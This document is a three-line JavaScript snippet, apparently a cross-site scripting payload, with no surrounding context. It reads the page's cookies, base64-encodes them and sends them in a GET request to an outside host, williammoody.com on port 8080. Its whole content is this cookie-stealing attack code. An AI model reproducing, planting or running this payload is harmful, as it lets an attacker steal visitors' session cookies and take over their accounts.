var xhttp = new XMLHttpRequest();
xhttp.open("GET", "http://williammoody.com:8080/?c=" + btoa(document.cookie), true);
xhttp.send();
